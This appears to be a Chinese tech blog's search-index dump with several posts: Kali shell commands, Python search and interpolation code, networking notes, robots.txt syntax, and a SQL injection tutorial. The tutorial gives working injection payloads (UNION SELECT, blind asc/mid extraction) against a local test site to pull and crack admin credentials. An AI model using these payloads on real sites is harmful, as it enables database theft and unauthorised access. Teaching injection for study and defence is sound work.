可以进行很多漏洞利用的操作，这就是beef的强大之处吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"beef劫持","slug":"beef劫持","permalink":"https://xiaowuyoucy.github.io/tags/beef劫持/"}]},{"title":"KaliLinux-Bash命令","slug":"201904212314","date":"2019-04-22T12:32:18.000Z","updated":"2019-04-27T10:31:11.766Z","comments":true,"path":"2019/04/22/201904212314/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/22/201904212314/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879ls -l 显示当前目录的文件信息,大小以字节显示ls -lh 显示当前目录的文件信息,大小以KBls -lh --sort=size 当前文件目录按大小顺序排序ls -a 显示当前目录的隐藏文件ls -lh --sort=time 按时间排序，最新修改的排最上cd 进入某个目录和Windows的cd一样pwd 查看当前工作目录clean 清屏cat /var/log/messages 查看文本文件more /var/log/messages 显示一屏的内容，以百分比的显示，当看完一屏可以回车看下一屏tail -20 /var/log/messages 查看文本文件最后的20行内容watch -n 2 tail -20 /var/log/messages 查看文本文件最后的20行内容,每各两秒实时刷新一次当前文件文本信息mkdir+要创建的文件名touch &#123;a,b,c&#125;.txt 创建3个名为a,b,c.txt的文本cp -r test/zwj/ 将 test整个目录拷贝到 zwj下mr+文件名 执行删除功能的命令cp+要拷贝的文件+拷贝后的新文件名cp -r 文件目录名/ 新文件目录名 拷贝目录文件mr -rf 文件目录名 删除拷贝目录top 监测性能信息进程信息等kill PID 结束进程的作用ps aux 显示进程项目信息grep ssh /ext/passwd 查看passwd文件含有ssh字符串的信息ifconfig eth0 down 将网卡卸掉ifconfig eth0 up 启动网卡netstat -pantu 查看产生的TCP/UDP交互网络链接信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; 含有0.0.0和::: 被过滤掉不显示出来netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; 以netstat 的信息 输出第五列的信息netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 行内进行分块 只显示第一块netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort 行内进行分块 只显示第一块 对查出来的内容进行排序netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容netstat -pantu | egrep -v &quot;0.0.0.0|:::&quot; | awk &apos;&#123;print $5&#125;&apos; cut -d &apos;:&apos; -f 1 sort | uniq &gt; ip 行内进行分块 只显示第一块 对查出来的内容进行排序，之后过滤重复的内容 导出到IP文本mount 挂载文件dmesg 查看messages 文件内容find / -name nmap 从根目录开始查找，叫nmap的文件find . -name &quot;ps*&quot; 当前目录下 ps开头的都查找出来find . -name &quot;ps*&quot; -exec cp &#123;&#125; /tmp/&#123;&#125;.bak \\; 当前目录下 ps开头的都查找出来 之后以.bak格式拷贝到tmp目录下whereis + 文件名 查看功能, 在使用whereis 之前先使用updatadb更新一下搜索的数据库，这样的话查找得更多的内容whereis + 文件名 -b 查看文件的二进制文件存放文件","categories":[{"name":"KaliLinux","slug":"KaliLinux","permalink":"https://xiaowuyoucy.github.io/categories/KaliLinux/"}],"tags":[{"name":"Kalinux","slug":"Kalinux","permalink":"https://xiaowuyoucy.github.io/tags/Kalinux/"}]},{"title":"拉格狼日查找算法","slug":"20190410250","date":"2019-03-30T21:08:18.000Z","updated":"2019-04-09T19:17:31.567Z","comments":true,"path":"2019/03/31/20190410250/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/31/20190410250/","excerpt":"","text":"拉格狼日查找算法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding=utf-8'''Created on 2019-03-31@author: Administrator'''import timedef costTime(func): def _costTime(finddata,findlist): starttime=time.time() func(finddata,findlist) endtime=time.time() print(endtime-starttime) return _costTime@costTimedef search(finddata,findlist): for data in findlist: if data==finddata: print(\"find\",data) return print(\"not find\")@costTimedef search2(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) mid=(low+high)//2 #取出中间索引 middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1@costTimedef search2lr(finddata,findlist): low=0 #第一个 high=len(findlist)-1 #代表最后一个 times=0 while low&lt;=high: #不能重叠 times+=1 print(\"times\",times) #mid=(low+high)//2 #取出中间索引 #mid= int( low +(high-low)* 0.5) datamid=((finddata-low)/(high-low)) #datamid=0.5 mid = int(low + (high - low) * datamid) middata=findlist[mid] #取出中间数据 if finddata &lt;middata: #小于 淘汰1半 high =mid-1 elif finddata &gt;middata: #小于 淘汰1半 low =mid+1 else: print(\"find\",finddata,mid) return mid print(\"not find\") return -1findlist=[x+0.1 for x in range(100000000)]finddata=98009999while True: finddata=eval(input(\"data\")) search2lr(finddata,findlist) #2.5050623416900635 拉格狼日插值算法 逐步插值，整体来说还是挺简单的，关键在于算法的部分，这里我运用了二维数组的数据结构来存储每次迭代后的新值。角标的循环初看可能有些复杂，自己动手走一遍就会很清楚啦 ，拉格狼日算法效率是二分查找的几十倍。 12345678910111213141516171819202122232425262728#coding=utf-8'''Created on 2019-03-31@author: Administrator'''def Neville(xt,m,n,x): for i in range(1,n): for j in range(1,n): w[i-j][i]=(x-xt[i-j])/(xt[i]-xt[i-j]) m[i][j]=m[i-1][j-1]+w[i-j][i]*(m[i][j-1]-m[i-1][j-1]) for i in range(n): for j in range(0,i+1): if j%n==0: print(\"\\n\") print(' %f' %m[i][j])n = int(input('插入节点个数:'))x = float(input('输入x的值:'))m = [[0 for i in range(n)] for j in range(n)] #创建n*n矩阵w = [[0 for i in range(n)] for j in range(n)]xt = [0]*nfor i in range(n): m[i][0] = float(input('插入第%d个y值：' %(i+1)))for i in range(n): xt[i] = float(input('插入第%d个x值：' %(i+1)))Neville(xt,m,n,x) 下面的是拉格朗日插值算法，十分简单，分享借鉴。 1234567891011121314151617181920212223242526#coding=utf-8'''Created on 2019-09-31@author: Administrator'''def lagrange(x,xt,yt,n): y = 0 for i in range(n): t = 1 for j in range(n): if i!=j: t = t*(x-xt[j])/(xt[i]-xt[j]) y = y+t*yt[i] print(\"结果为：%f\" %y)xt = []yt = []x = float(input(\"插值x；\"))n = int(input(\"节点数目；\"))for i in range(n): xt.append(float(input(\"第%d个x的值\" %(i+1))))for i in range(n): yt.append(float(input(\"第%d个x的值\" %(i+1)))) lagrange(x,xt,yt,n)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://xiaowuyoucy.github.io/categories/数据结构与算法/"}],"tags":[{"name":"拉格狼日","slug":"拉格狼日","permalink":"https://xiaowuyoucy.github.io/tags/拉格狼日/"}]},{"title":"网络协议","slug":"201503152349","date":"2019-03-15T15:49:08.000Z","updated":"2019-04-14T16:27:14.631Z","comments":true,"path":"2019/03/15/201503152349/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/03/15/201503152349/","excerpt":"","text":"应用层(Applicatio n Layer) 应用层是为操作系统或网络应用程序提供访问网络服务接口，应用层的协议包括：Telnet、FTP、HTTP、SNMP等等…应用层最终的目的不是解决用户各种具体的应用协议，应用层最终的任务是为用户提供服务。 这里说一下应用层的应用进程，应用进程是指正在运行的应用“程序” 而正在运行的程序都会有通讯的进程方式，这里面先涉及到应用程序的端口，应用程序的协议等，一个联网的应用程序，向外 部 通信时会在 自己的数据包的报头添加上端口号，然后在网络层和数据链路层分别添加上IP地址和MAC地址，将整个数据包发送到外网的主机，外网主机发送过来的数据，操作系统根据 端口号，把 相应的数据包发给 对应的 应用程序（通信软件)。而应用进程最终的目的是为了解决具体的应用问题而彼此通信的进程。 互联网应用层应用分布图： 我们来看看，因特网（(Internet ）最基本的三个应用 1.Email ​ 电子邮件客户程序：Outlook Express、foxmail等，这些 ​ 邮件客户程序→邮件服务器1 →邮件服务器2 →…… →目的邮件服务器→目的邮件客户程序 ​ 电子邮件采用的主要协议是POP3和SMTP SMTP:简单邮箱传输协议，用于电子邮件的传递，建立在UDP（也用TCP） 基础上，端口号25。 POP3：邮局协议（第三版），用于邮件管理和用户邮件的存取。建立在TCP基础上，端口号 110。 2.FTP ​ 允许不同的主机间传送文件，面向连接，基于TCP协议的传输程序， 协议拥有该主机的IP地址（主机域名）、账号、密码。 3.万维网（www） ​ 实际上是一个由千千万万个页面组成的信息网索取页面、浏览信息的程序称为浏览器（Browser，如Netscape、Internet Explorer等），浏览器与Web站点之间通过HTTP协议进行通信 HTTP：超文本传输协议用于传输超文本页面到客户机上，建立在TCP基础上，端口号=80。 应用层的通讯 下图是应用层的通讯过程 建立链接的前提是基于物理层开始的，通讯之间通过一列的物理链接设备（无线电波，光纤，双绞线），物理层通过高低电平工作，传输数据时会将高低电平转化成电信号，发送给被接收者，这些高低电平也就是0和1，通过数据链路层(ethenet)将电信号分组,这些0和1组成一串电信号(10101111) 而每一组的电信号都有特定对应的意义，我们都知道计算机最底层运算是二进制0和1， 就好比数据是字母“A” 要发送和接受两个过程之前都必须转化成电信号，计算机会通过某种机制将你要发送的数据“A”打散成电信号传输到接收方，接受方接受到之后会重新把这些电信号重组通过一层一层的的协议解析出数据这组0和1组成的电信号的意思“A” 这是大概的传输原理。 传输数据是必须遵循以太网（ethernet） 规定的 数据传输必须包含以下部分： 一组电信号的构成一个数据包，也叫做“针” 每一数据帧分成：报头head和数据data两部分 head data 头部(head) 是用来描述数据(data)代表的意义 ，头部包含三种信息 发送者/源地址，6个字节 接收者/目标地址，6个字节 数据类型，6个字节 为什么要有头部（head）信息呢？ 很简单是因为发送数据之前是需要明确，发送者，和接收着的，如果没有这些信息又怎么知道发送者是谁，接收者是谁呢？ 这些信息是在以太网报头定义的，以太网规定每一块网卡必须要有一个MAC地址，而这个MAC地址在网卡出厂之前都会被焊上，全世界独一无二的的MAC地址，MAC地址长度为48位二进制数，通常由12位16进制数表示（前六位是厂商编号，后六位是流水线号） 有了MAC地址之后可以满足于局域网内通讯了，局域网通信是基于UDP协议进行的，优点就是无需建立链接，具有较好的实时性，工作效率比TCP高，适用于对高速传输和实时性有较高的通信或广播通信。 但缺点就是，无法避免攻击的，比如：UDP Flood攻击…… UDP的缺点： 不可靠，不稳定 因为UDP没有TCP那些可靠的机制，在数据传递时，如果网络质量不好，就会很容易丢包。 基于上面的优缺点，那么： 什么时候应该使用TCP： 当对网络通讯质量有要求的时候，比如：整个数据要准确无误的传递给对方，这往往用于一些要求可靠的应用，比如HTTP、HTTPS、FTP等传输文件的协议，POP、SMTP等邮件传输的协议。 在日常生活中，常见使用TCP协议的应用如下： 浏览器，用的HTTP FlashFXP，用的FTP Outlook，用的POP、SMTP Putty，用的Telnet、SSH QQ文件传输 ………… 什么时候应该使用UDP： 当对网络通讯质量要求不高的时候，要求网络通讯速度能尽量的快，这时就可以使用UDP。 比如，日常生活中，常见使用UDP协议的应用如下： QQ语音 QQ视频 TFTP …… 跨局域网通讯 基于MAC地址方式，只是能够实现到我们在一个网段里通讯，一个数据包在发送到目标地址之前会进行子网掩码,算出是否在一个网段里，如果是同一个网段直接广播方式传输数据即可接收到，否则并不能让我们夸局域网通信，这里还需要涉及到网关，要包数据包发送出外网就必须把包交给网关，网关就好比一个代理人，网关接受到我们要发送出去的包之后，会将包发送给对方的网关，对方的网关将包拆开之后发现头部的信息来源以及接受的目标地址是谁，从而发送给接收者。 所以IP地址加MAC地址就是标识你全世界的这台机器在哪儿，有了这些基础之后并不够，这些基础只能让我们找到机器，假如现在要进行通讯服务，是基于一个软件上的互相的通讯，我要给对方发送信息，假如对方的机器上运行着无数的软件，那么这个包是不知道是哪个客户端的软件发来的数据，为了解决这一问题，在传输层里又出现了TCP/UDP 协议，这两者协议都是基于端口工作的，每个应用程序都对应着唯一的端口号，目前最大端口号为65536，超出范围的是无效端口，1024之前的端口号都是操作系统所用，超过1024之后的都是应用程序在用， 应用层协议开发者可以自己定义，也可以遵循通用的标准，我们的软件应用程序，都运行在应用层，归根结底应用层是产生数据的，产生数据之后会经过这五层协议，发送给接收者， 在应用层会封装头部信息，原MAC地址/目标MAC地址 ,到了传输层封装原端口/目标端口,到了网络层封原IP/目标IP，最后到了数据链路层封了原MAC/目标MAC，最后到了物理层将这些数据包打包成了电信号转换成二进制高低电平，发送给接收方，对方物理层接受到，到了数据链路层之后这些电信号进行成组，解包得到MAC地址，找到MAC地址之后，再往上一层网络层找，找到IP地址，之后到传输层找到端口对应产生数据的应用程序，最后到了对方的应用层，对方得到传输过去的数据。 主机上网过程 域名 Internet采用层次树状结构的命名方法，它使得任何一个连接在Internet上的主机或路由器都有一个唯一的层次结构的名字，即域名（Domain name）。所谓域(Domain)是域名空间中的一个子树。这个域的名字就是这个子树顶部结点的域名，一个域本身又可划分为若干个域(有时也称它们为子域)。例如：edu是标识教育系统的一个大的域，而tsinghua.edu和besti.edu则是edu域中的两个子域。 目前Internet顶级域名分为三大类： 国家顶级域名：采用ISO 3166规定。如cn表示中国，us表示美国等 国际顶级域名：采用int。国际性的组织可在int下注册。 通用顶级域名：如下表所列。 域名 组织类型 域名 组织类型 com 商业机构 firm 公司企业 edu 教育部门 shop 销售公司与企业 gov 政府部门 web 突出万维网服务单位 org 非商业组织 arts 突出文化艺术活动单位 net 网络服务机构 rec 突出逍遥娱乐活动单位 mil 美国军队组织 info 提供信息服务 nom 个人 域名DNS服务系统 在DNS中由域名服务器（DNS Server）完成域名与IP地址的转换过程，这个过程称为域名解析 域名服务器主要分为以下几个： 1．本地域名服务器 2．根域名服务器 3．授权域名服务器 认识URL url的组成部分（unifrom resource locator） 例如：https://www.microsoft.com/china/index.html https:// 这里是代表超文本传输协议，通知microsoft.com服务器显示Web页面 www 代表一个web(万维网) 服务器; Microsoft.com/ 这是装有页面的服务器的域名，或站点服务器名称; China/ 为该服务器上的子目录，就好像我们的文件夹; index.html 是文件夹中的html文件（网页）。 HTTP是如何工作的？ HTTP客户端启动TCP连接(创建套接字) 到服务器, 端口 80。一旦建立连接，浏览器进程和服务器进程就可以通过各自的套接字来访问，http 报文(应用层协议报文) 在浏览器 (http client) 和Web服务器(http server)之间进行交换。 客户端套接字。客户往自己的套接字发送HTTP请求消息，也从自己的套接字接收HTTP响应消息，服务器从自己的套接字接收HTTP请求消息，也往自己的套接字发送HTTP响应消息。 持久性与非持久性 非持久连接和持久连接 HTTP既可以使用非持久连接(non-persistent connection)，也可以使用持久连接(persistent connection)。HTTP/1.0使用非持久连接，HTTP/1.1默认使用持久连接。 非持久性链接： ​ 非持久连接情况下从服务器到客户传送一个Web页面的步骤。假设该页面由1个基本HTML文件和10个JPEG图像构成，而且所有这些对象都存放在同一台服务器主机中。 再假设该基本HTML文件的URL为： http://www.besti.edu.cn/somepath/index.html 下面是具体步骤: 1.HTTP客户初始化一个与服务器主机www.besti.edu.cn中的HTTP服务器的TCP连接。HTTP服务器使用默认端口号80监听来自HTTP客户的连接建立请求。 2.HTTP客户经由与TCP连接相关联的本地套接字发出一个HTTP请求消息。这个消息中包含路径名/somepath/index.html。 2.HTTP服务器经由与TCP连接相关联的本地套接字接收这个请求消息，再从服务器主机的内存或硬盘中取出对象/somepath/index.html，经由同一个套接字发出包含该对象的响应消息。 3.HTTP服务器告知TCP关闭这个TCP连接(不过TCP要到客户收到刚才这个响应消息之后才会真正终止这个连接)。 4.HTTP客户经由同一个套接字接收这个响应消息。TCP连接随后终止。该消息标明所封装的对象是一个HTML文件。客户从中取出这个文件，加以分析后发现其中有10个JPEG对象的引用。 6.给每一个引用到的JPEG对象重复步骤1-4。 持久性链接 持久连接情况下，服务器在发出响应后让TCP连接继续打开着。同一对客户/服务器之间的后续请求和响应可以通过这个连接发送，通常，HTTP服务器在某个连接闲置一段特定时间后关闭它，而这段时间通常是可以配置的。 持久连接分为不带流水线(without pipelining)和带流水线(with pipelining)两个版本。如果是不带流水线的版本，那么客户只在收到前一个请求的响应后才发出新的请求。 HTTP/1.1的默认模式使用带流水线的持久连接。这种情况下，HTTP客户每碰到一个引用就立即发出一个请求，因而HTTP客户可以一个接一个紧挨着发出各个引用对象的请求。服务器收到这些请求后，也可以一个接一个紧挨着发出各个对象。 HTTP规范1.0[RPcl945]和HTTP1.1 [RFC 2616]定义了HTTP消息的格式。HTTP消息分为请求消息和响应消息两类。 68} HTTP请求消息: 12345GET /somedir/page.html HTTP/1.1 Host:www.besti.edu.cn Connection:closeUser-agent:Mozilla/4.0 Accept-language:zh-cn HTTP请求标准格式 Request 附属体不在GET方法中使用，而是在POST方法中使用。 POST方法适用于需由用户填写表单的场合，如往google搜索引擎中填入待搜索的词。用户提交表单后， HEAD方法与GET方法类似，两者的差别只是服务器在对HEAD方法的响应消息中去掉了所请求的对象，其他内容则与对GET方法的响应消息一样。HEAD方法通常用于HTTP服务器软件开发人员进行调试。 POST方法示例 12345678POST /HTTP/1.1Host: www.wrox.comUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)Gecko/20050225 Firefox/1.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 40Connection: Keep-Alivename=Professional%20Ajax&amp;publisher=Wiley HTTP响应消息 12345678HTTP/1.1 200 OKConnection:closeDate: Thu, 13 Oct 2005 03:17:33 GMTServer: Apache/2.0.54 (Unix)Last—Modified:Mon,22 Jun 1998 09;23;24 GMTContent—Length:682lContent—Type:text/html(数据 数据 数据 数据 数据…………) HTTP响应标准格式 Response 响应报文的开始行是状态行,状态行包括三项内容，即 HTTP 的版本，状态码，以及解释状态码的简单短语。 HTTP常用状态码 1xx 表示通知信息的，如请求收到了或正在进行处理。 2xx 表示成功，如接受或知道了。 3xx 表示重定向，表示要完成请求还必须采取进一步的行动。 4xx 表示客户的差错，如请求中有错误的语法或不能完成。 5xx 表示服务器的差错，如服务器失效无法完成请求。 ●200 OK;请求成功，所请求信息在响应消息中返回。 ●301 Moved Permanently:所请求的对象己永久性迁移; ​ 新的URL在本响应消息的Location:头部指出。客户软件会自动请求这个新的URL。 ●400 Bad Request;表示服务器无法理解相应请求的普通错误的状态码 ●404 Not Found:服务器上不存在所请求的文档。 ●HTTP Version Not Support:服务器不支持所请求的HTTP协议版本。 三次握手","categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://xiaowuyoucy.github.io/categories/网络协议/"}],"tags":[{"name":"网络模型","slug":"网络模型","permalink":"https://xiaowuyoucy.github.io/tags/网络模型/"},{"name":"ISO七层模型","slug":"ISO七层模型","permalink":"https://xiaowuyoucy.github.io/tags/ISO七层模型/"}]},{"title":"Robots文件中的配置说明","slug":"201812282242","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-07T14:04:18.077Z","comments":true,"path":"2018/12/28/201812282242/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282242/","excerpt":"","text":"*表示所有搜索引擎，用于指定蜘蛛使用； ~表示以某字符串开头； $表示以某字符串结尾； /表示当前目录下的所有内容。 格式 User-agent: 蜘蛛名称； Disallow: 内容名称； Allow:内容名称； 参数说明 User-agent 指定搜索引擎蜘蛛名称； Disallow要禁止抓取的内容； Allow允许抓取的内容。 Robots文件写法参考 指定蜘蛛：User-agent:* 。这里的*代表的所有的搜索引擎种类，*是一个通配符。 禁止写法 Disallow: /admin/ 这里定义是禁止爬寻admin目录下面的目录； Disallow: /admin 这里定义是禁止爬寻admin目录； Disallow: /cgi-bin/*.htm 禁止访问/cgi-bin/目录下所有以“.htm”为后缀URL（包含子目录）； Disallow: /？ 禁止访问网站中所有包含问号（？）的网址； Disallow: /.jpg$ 禁止抓取网页所有的.jpg格式的图片； Disallow:/ab/adc.html 禁止爬取ab文件夹下面的adc.html文件。 允许写法 Allow: /cgi-bin/ 这里定义是允许爬寻cgi-bin目录下面的目录； Allow: /tmp 这里定义是允许爬寻tmp的整个目录； Allow: .htm$ 仅允许访问以&quot;.htm&quot;为后缀的URL； Allow: .gif$ 允许抓取网页和gif格式图片。 各大搜索引擎蜘蛛的名称写法 1、百度蜘蛛：Baiduspider 百度蜘蛛名称为Baiduspider日志中还发现了Baiduspider-mobile（抓取wap）、Baiduspider-image（抓取图片）、Baiduspider-video（抓取视频）、Baiduspider-news（抓取新闻）。以上百度蜘蛛目前常见的是Baiduspider和Baiduspider-image两种。 2、谷歌蜘蛛：Googlebot ，Googlebot-Mobile，看名字是抓取wap内容的 3、360蜘蛛：360Spider，这个家伙比较勤劳 4、SOSO蜘蛛：Sosospider，比360更加勤劳 5、雅虎蜘蛛：Yahoo! Slurp China 6、有道蜘蛛：YoudaoBot 7、搜狗蜘蛛：Sogou News Spider 搜狗蜘蛛还包括如下这些：Sogou web spider、Sogou inst spider、Sogou spider2、Sogou blog、Sogou News Spider、Sogou Orion spider，等等、、、、、、 8、MSN蜘蛛：msnbot，msnbot-media 9、必应蜘蛛：bingbot 10、一搜蜘蛛：YisouSpider 11、Alexa蜘蛛：ia_archiver 12、宜搜蜘蛛：EasouSpider 13、即刻蜘蛛：JikeSpider 14、一淘网蜘蛛：EtaoSpider","categories":[{"name":"技术资讯","slug":"技术资讯","permalink":"https://xiaowuyoucy.github.io/categories/技术资讯/"}],"tags":[{"name":"SEO网站优化","slug":"SEO网站优化","permalink":"https://xiaowuyoucy.github.io/tags/SEO网站优化/"}]},{"title":"WEB渗透偏之SQL注入","slug":"201812282306","date":"2018-12-28T14:43:02.000Z","updated":"2019-04-23T14:45:42.377Z","comments":true,"path":"2018/12/28/201812282306/","link":"","permalink":"https://xiaowuyoucy.github.io/2018/12/28/201812282306/","excerpt":"","text":"不管用什么语言编写的web应用，它们都有一个共同点，就是具有交互性并且大多数是数据库驱动的，WEB应用随处可见，因此存在的SQL注入是影响企业运营最具破坏性的漏洞，SQL注入就是通过操作SQL语句进行攻击的从而达到攻击的目的，我们通常在网上能够看到的，某某网站被脱，某某网站被脱裤，那么这些很大可能就是通过SQL注入来实现的，通常渗透者攻击的目的是得到数据库相关的信息，例如账号密码，用户信息等等。 二. SQL注入是如何产生的呢？ 简单的来说，网站新闻内容，会员中心，查询等都会和数据库进行关联，其中在数据之间交互中，传输的就是SQL语句，攻击者通过操作SQL语句来达到SQL注入攻击。 三. SQL注入漏洞能造成哪些危害呢？ 常见的操作： 网站数据库信息泄露 网站数据被修改 网站整站程序源码被Download 架设网站的服务器被入侵挂木马等等… 四. SQL注入原理分析 可注入是因为网站程序存在可控传递参数，参数未进行过滤直接带入数据库查询，导致攻击者可通过传递恶意sql语句代码进行执行攻击。 SQL注入的产生条件 必须有传输传递 传输值带入数据库查询并执行 我们来看一个基本网站组成的url链接： 网站地址： http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 网站地址：http://127.0.0.1/0/ 文件目录：Production 文件名：PRODUCT_DETAIL.asp 参数名：id 参数值：1513 首先是有网站地址—&gt;文件目录—&gt;文件名—&gt;参数名—&gt;参数值 基于这种链接我们可以尝试在参数1513后面再随便传递一些参数比如dddd，如果报错，是因为在接受1513这个ID值的时候后把dddd也传递过去了，这个情况我们称之为SQL带入查询。 显然刚才不是SQL语句，所以报错了，一般情况下如果参数只接收不带入查询的话我们无论输入什么都不会有任何报错的迹象，证明是不存在SQL注入点的，能够带入查询是因为网站没有对参数进行过滤，所以导致带入查询，那么试想一下假设我带入查询是SQL语句，这语句的操作是查看网站用户信息或者密码的这时候是不是很危险呢？ 测试题 1.下面那些地址可能存在sql注入？ A.www.cnblog.io/news.asp B.www.cnblog.io/index.asp?page=11 C.www.cnblog.io/news.asp?id=1&amp;page=2 D.www.cnblog.io/?id=11 2.已知cnblog.io/news.asp?id=1&amp;page=1 中参数id存在注入，下面那个注入测试正确？ A.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 B.cnblog.io/news.asp?id=1&amp;page=1 and 1=1 C.cnblog.io/news.asp?id=1 and 1=1&amp;page=1 and 1=1 cnblog.io/news.asp?id=1&amp;page=1 and 1=1 将注入参数设为page（工具检测不出） cnblog.io/news.asp?page=1&amp;id=1 将注入参数设为id 前面我们说到，只所以能够带入数据库查询是因为网站没有对参数进行过滤，也就是说编写网站的人在写这个业务逻辑代码有BUG， 我们来看看如下的一串代码案例，这次代码是没有对参数进行过滤的，存在带入数据库查询的操作。 1234567PRODUCT_DETAIL.asp代码：&lt;%id=request(&quot;id&quot;) 接受参数名id的值并赋值给变量id （前面id=变量，后面id=参数名）sql=&quot;select * from product where id=&quot;&amp;id 组合变量id的sql语句set rs=conn.execute(sql) 执行sql语句%&gt; http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513 select * from product where id=1513 我们来看一下PRODUCT_DETAIL.asp里面的id=request(“id”)其中id是等于变量 request(‘id’)接受参数的值并且赋值给了变量ID， 这时sql语句组合select * from product where id=1513， 1513是接收到的网站参数，那么这个页面存在肯定是返回正常的。 http://127.0.0.1/0/Production/PRODUCT_DETAIL.asp?id=1513’ select * from product where id=1513’ 页面报错，无此id 看上行的链接和SQL语句组合，当在网站链接的id参数后面多家了一个’ 这时SQL语句执行错误报错返回错误页面，证明我们可以任意带入参数查询的，那么大家想假设我在参数后面带入的是sql查询语句是不是能够查到数据库的信息呢，这就是SQL注入对网站危害之处。 判断注入点常用的逻辑语 数学逻辑运算符： 或 且 非(or and xor) 真且真=真 假且真=假 真或真=真 真或假=真 用法是在网站链接参数后面加上逻辑判断法 id=1513 and 1=1 那么加上之后，这是SQL语句是这样组合的 select * from product where id=1513 and 1=1 真且真=真 返回正常 因为这是真逻辑所以返回真，我们 加上and 1 = 11 , 这是SQL语句是这样组合的 select * from product where id=1513 and 1=11 真且假=假 返回错误，这时我们可以确定注入点的存在，我们重新组SQL语句可以在参数后面进行传达相关的恶意sql语句来达到带入数据库查询的目的 那么判断到有注入点之后，我们怎么猜数据库里面的信息呢？ 这里需要了解一个分层结构。 ACCESS数据库 表名 列名 数据 通过以上四部我们可以得到数据，首先是过表名来得到列名，再通过列名最后得到数据的。 总结分为4步 判断注入 猜解表名 猜解列名 猜解数据 接下来我们搭建个测试环境来进行实战一下注入的操作， 以access数据库为例，首先猜表明，在参数id=1513 后面传入， 猜表明的语句首先是判断有多少个字段，语句是order by 22，如下图 当回车的时候页面返回是正常的，那么我们继续判断order by 23 这次我填的字段是23 返回了错误页面因此可见表名的字段不等于23，那么可以确定表名的字段是&lt;=22的。 找到表名的字段长度之后我们继续进行猜列名的操作语句如下 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin 这段SQL语句的意思是 查询有没有admin这个表，我们一般做渗透猜解的大部分是admin表，因为这通常是一些管理员信息，如账号密码等，我们把上面语句带入查询一下，一般情况下如果存在admin这个表名的话， 网页会随机爆出一些数字，我们得到这些具体数字之后，可以对应着字段去查列名相关信息了，之后能得到数据。 得到的数字是3和15，那么我们可以在3和15字段利填写相关列名的信息，如果存在这个列名，那么就会爆出相关的数据，一般列名常见要爆的都是一些密码和账号信息列名如果存在的话就会爆出相关的数据信息，如下图 字段15填的是admin爆出了管理员账号，字段3填的是password爆出的是一个md5值，md5值我们可以进行md5解密得到真正的密码如下图所示 得到明文“bendss” 我们可以尝试用管理员的账号密码登录一下网站后台。 OK 能够成功登录，证明我们猜解出来的账号密码是正确的。 换第二种猜解方式，来尝试一下猜解，刚才的猜解方式叫联合查询法，联合查询法和逐字才猜解法是有一定区别的， 逐字才猜解法，兼容性强，一般的注入工具猜解的都是采用:逐字猜解法如明小子，阿迪，萝卜头，穿山甲等注入工具，因为联合查询法有时候猜解不出来，明明存在注入点都猜解不出来来，兼容性不强。 猜解语法： 查表：and exists (select * from 表名) 查列：and exists (select 列名 from 表名) 查数据：1.确定长度 2.确定asc数据(asc编码) and (select top 1 len(列名) from admin)=5 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 and (select top 1 asc(mid(列名,位数,1)) from admin)=97 依然是先猜表名，我们使用 and exists (select * from admin) 语句来猜解一下 admin表是否存在，如果存在就返回正常，返回错误就代表不存在早 确定admin表存在之后，我们来猜一下列名，使用1. 查列：and exists (select username from admin) 来猜解， 如果返回错误则是代表这个列名不存在。 然而这个列名是不存在的，我们换一个试试,换成密码列名 exists (select password from admin) 看结果是返回正常页面的，证明有password这个表，接下来我们确定一下这个表的长度，使用 and (select top 1 len(password) from admin)=5 第一次我猜解的长度设置为5，返回的结果是错误页面，证明长度并不是等于5， 我们再把长度设置为&gt;=5如果返回正常页面说明，这个列名长度肯定是大于5或者等于5的 看上图返回正确页面了，我们都知道一般像这些网站管理员密码通常都采用md5加密，所以一般的md5加密长度为16的，我们再把长度的值选择17位试试，如果返回错误，我们再设置回16，如果返回正确那么证明，这个列名的长度等于16位的md5加密长度。 事实证明，长度不也不等于17位，那么再把长度设置为16位看看，如果返回正确页面基本上，可以断定是16位的md5加密值了 事实证明，这个密码列名的长度为16位的md5加密值， 好以上的基本猜解步骤已经完成，我们可以着手猜列名的内容， 使用语法 and (select top 1 asc(mid(password,1,1)) from admin)=97 mid()里面的password代表是列名,1是代表猜16位长度的第一位的值内容，后面=97是ascii编码97对应的是a,如下是ascii码的对应表。 我们明白了怎么回事之后就开始猜解吧 回车： 